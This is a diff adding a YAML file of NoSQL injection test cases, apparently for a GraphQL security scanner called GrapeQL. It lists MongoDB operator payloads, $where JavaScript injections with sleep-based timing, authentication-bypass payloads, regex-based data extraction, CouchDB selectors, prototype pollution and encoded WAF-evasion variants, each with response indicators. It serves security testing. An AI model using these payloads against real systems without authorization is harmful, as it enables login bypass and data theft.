@@ -1,0 +1,295 @@
+# GrapeQL NoSQL Injection Test Cases
+# Author: Aleksa Zatezalo
+# Version: 3.0
+#
+# Targets MongoDB, CouchDB, and other NoSQL backends behind GraphQL resolvers.
+# GraphQL APIs that pass user-supplied strings into NoSQL query operators
+# (e.g. $where, $regex, $gt) without sanitization are vulnerable.
+#
+# Each test case has:
+#   - name:       Human-readable label
+#   - payload:    The raw string injected into a GraphQL String argument
+#   - indicators: Strings in the response that signal a successful injection
+
+test_cases:
+  # ── MongoDB Operator Injection ────────────────────────────────────────
+  # When resolvers build queries like: db.collection.find({ field: userInput })
+  # and the input is parsed as JSON or interpolated into a query object.
+
+  - name: mongo_ne_operator
+    payload: '{"$ne": ""}'
+    indicators: &mongo_indicators
+      - "MongoError"
+      - "mongo"
+      - "Mongo"
+      - "BSON"
+      - "ObjectId"
+      - "$err"
+      - "MongoServerError"
+      - "BSONTypeError"
+      - "CastError"
+      - "ValidationError"
+      - "E11000"
+      - "errmsg"
+      - "codeName"
+      - "WriteError"
+      - "BadValue"
+
+  - name: mongo_gt_operator
+    payload: '{"$gt": ""}'
+    indicators: *mongo_indicators
+
+  - name: mongo_gte_operator
+    payload: '{"$gte": ""}'
+    indicators: *mongo_indicators
+
+  - name: mongo_lt_operator
+    payload: '{"$lt": "~"}'
+    indicators: *mongo_indicators
+
+  - name: mongo_regex_all
+    payload: '{"$regex": ".*"}'
+    indicators: *mongo_indicators
+
+  - name: mongo_regex_admin
+    payload: '{"$regex": "^admin"}'
+    indicators: *mongo_indicators
+
+  - name: mongo_in_operator
+    payload: '{"$in": ["admin", "root", "test"]}'
+    indicators: *mongo_indicators
+
+  - name: mongo_nin_operator
+    payload: '{"$nin": ["impossible_value_xyz"]}'
+    indicators: *mongo_indicators
+
+  - name: mongo_exists_true
+    payload: '{"$exists": true}'
+    indicators: *mongo_indicators
+
+  - name: mongo_or_bypass
+    payload: '{"$or": [{"": ""}, {"$gt": ""}]}'
+    indicators: *mongo_indicators
+
+  # ── MongoDB $where / JS Injection ─────────────────────────────────────
+  # If the resolver uses $where with string concatenation, JavaScript executes
+  # server-side. These test for both data exfiltration and boolean-based blind.
+
+  - name: mongo_where_true
+    payload: "' || true || '"
+    indicators: &js_indicators
+      - "MongoError"
+      - "SyntaxError"
+      - "ReferenceError"
+      - "TypeError"
+      - "$where"
+      - "code 16722"
+      - "JSInterpreterFailure"
+      - "javascript"
+      - "sleep"
+
+  - name: mongo_where_1_eq_1
+    payload: "1' || '1'=='1"
+    indicators: *js_indicators
+
+  - name: mongo_where_sleep
+    payload: "';sleep(5000);'"
+    indicators: *js_indicators
+
+  - name: mongo_where_this
+    payload: "' || this.password || '"
+    indicators: *js_indicators
+
+  - name: mongo_where_function
+    payload: "';return true;var x='"
+    indicators: *js_indicators
+
+  - name: mongo_where_tojsononeline
+    payload: "' || tojsononeline(this) || '"
+    indicators: *js_indicators
+
+  # ── GraphQL-Specific NoSQL Patterns ───────────────────────────────────
+  # GraphQL variables and arguments are often JSON-parsed then passed directly
+  # to NoSQL drivers. These exploit that JSON → query object pipeline.
+
+  - name: graphql_nested_ne
+    payload: '{"password": {"$ne": ""}}'
+    indicators: *mongo_indicators
+
+  - name: graphql_nested_gt
+    payload: '{"password": {"$gt": ""}}'
+    indicators: *mongo_indicators
+
+  - name: graphql_nested_regex
+    payload: '{"username": {"$regex": ".*"}, "password": {"$ne": ""}}'
+    indicators: *mongo_indicators
+
+  - name: graphql_array_injection
+    payload: '["admin", {"$gt": ""}]'
+    indicators: *mongo_indicators
+
+  # ── Authentication Bypass Patterns ────────────────────────────────────
+  # Common login mutation bypass: variables like { username: X, password: Y }
+  # where Y is replaced with an operator.
+
+  - name: auth_bypass_ne_empty
+    payload: '{"$ne": null}'
+    indicators: &auth_bypass_indicators
+      - "token"
+      - "jwt"
+      - "JWT"
+      - "accessToken"
+      - "access_token"
+      - "session"
+      - "sessionId"
+      - "Bearer"
+      - "authenticated"
+      - "success"
+      - "login"
+
+  - name: auth_bypass_gt_empty
+    payload: '{"$gt": ""}'
+    indicators: *auth_bypass_indicators
+
+  - name: auth_bypass_regex_wildcard
+    payload: '{"$regex": ".*"}'
+    indicators: *auth_bypass_indicators
+
+  - name: auth_bypass_ne_null
+    payload: '{"$ne": "impossible_password_that_never_matches"}'
+    indicators: *auth_bypass_indicators
+
+  - name: auth_bypass_or
+    payload: '{"$or": [{"$gt": ""}, {"$regex": ".*"}]}'
+    indicators: *auth_bypass_indicators
+
+  # ── Boolean Blind NoSQL Injection ─────────────────────────────────────
+  # Pairs of true/false payloads. If the true payload returns data and the
+  # false payload returns empty/error, blind injection is confirmed.
+
+  - name: blind_true_ne
+    payload: '{"$ne": "definitely_not_this_value_12345"}'
+    indicators: &blind_indicators
+      - "data"
+      - "id"
+      - "name"
+      - "username"
+      - "email"
+
+  - name: blind_false_eq
+    payload: '{"$eq": "definitely_not_this_value_12345"}'
+    indicators: *blind_indicators
+
+  - name: blind_true_regex
+    payload: '{"$regex": ".+"}'
+    indicators: *blind_indicators
+
+  - name: blind_false_regex
+    payload: '{"$regex": "^$"}'
+    indicators: *blind_indicators
+
+  - name: blind_true_gt
+    payload: '{"$gt": ""}'
+    indicators: *blind_indicators
+
+  - name: blind_false_lt
+    payload: '{"$lt": ""}'
+    indicators: *blind_indicators
+
+  # ── Time-Based Blind (MongoDB $where with sleep) ──────────────────────
+  # If response time increases significantly, the $where clause executed.
+
+  - name: time_blind_sleep_5s
+    payload: "';sleep(5000);var x='"
+    indicators: *js_indicators
+
+  - name: time_blind_sleep_10s
+    payload: "';sleep(10000);var x='"
+    indicators: *js_indicators
+
+  - name: time_blind_while_loop
+    payload: "';var d=new Date();while(new Date()-d<5000){};var x='"
+    indicators: *js_indicators
+
+  # ── Data Exfiltration via $regex ──────────────────────────────────────
+  # Character-by-character extraction using regex anchors.
+
+  - name: exfil_regex_starts_a
+    payload: '{"$regex": "^a"}'
+    indicators: *blind_indicators
+
+  - name: exfil_regex_starts_b
+    payload: '{"$regex": "^b"}'
+    indicators: *blind_indicators
+
+  - name: exfil_regex_length_probe
+    payload: '{"$regex": "^.{8}$"}'
+    indicators: *blind_indicators
+
+  - name: exfil_regex_alphanumeric
+    payload: '{"$regex": "^[a-zA-Z0-9]"}'
+    indicators: *blind_indicators
+
+  # ── CouchDB / Other NoSQL ─────────────────────────────────────────────
+  # Less common but worth testing if the backend isn't MongoDB.
+
+  - name: couchdb_selector_all
+    payload: '{"selector": {"_id": {"$gt": null}}}'
+    indicators: &couch_indicators
+      - "couchdb"
+      - "CouchDB"
+      - "docid"
+      - "doc_count"
+      - "total_rows"
+      - "design_doc"
+      - "Erlang"
+      - "badarg"
+
+  - name: couchdb_all_docs
+    payload: '{"_all_docs": true}'
+    indicators: *couch_indicators
+
+  - name: couchdb_design_view
+    payload: '{"startkey": "", "endkey": "\ufff0"}'
+    indicators: *couch_indicators
+
+  # ── Prototype Pollution / Object Injection ────────────────────────────
+  # If the GraphQL resolver merges user input into query objects without
+  # sanitization, prototype pollution can alter query behavior.
+
+  - name: proto_pollution_constructor
+    payload: '{"__proto__": {"isAdmin": true}}'
+    indicators: &proto_indicators
+      - "isAdmin"
+      - "admin"
+      - "role"
+      - "__proto__"
+      - "constructor"
+      - "prototype"
+
+  - name: proto_pollution_proto_ne
+    payload: '{"constructor": {"prototype": {"$ne": ""}}}'
+    indicators: *proto_indicators
+
+  - name: proto_pollution_admin_role
+    payload: '{"__proto__": {"role": "admin"}}'
+    indicators: *proto_indicators
+
+  # ── Encoded / Evasion Variants ────────────────────────────────────────
+  # WAF and input filter bypass via unicode, URL encoding, mixed case.
+
+  - name: unicode_ne_operator
+    payload: '{\u0022$ne\u0022: \u0022\u0022}'
+    indicators: *mongo_indicators
+
+  - name: url_encoded_ne
+    payload: '%7B%22%24ne%22%3A%22%22%7D'
+    indicators: *mongo_indicators
+
+  - name: nested_json_string
+    payload: '{\"$ne\": \"\"}'
+    indicators: *mongo_indicators
+
+  - name: double_encoded_ne
+    payload: '%257B%2522%2524ne%2522%253A%2522%2522%257D'
+    indicators: *mongo_indicators
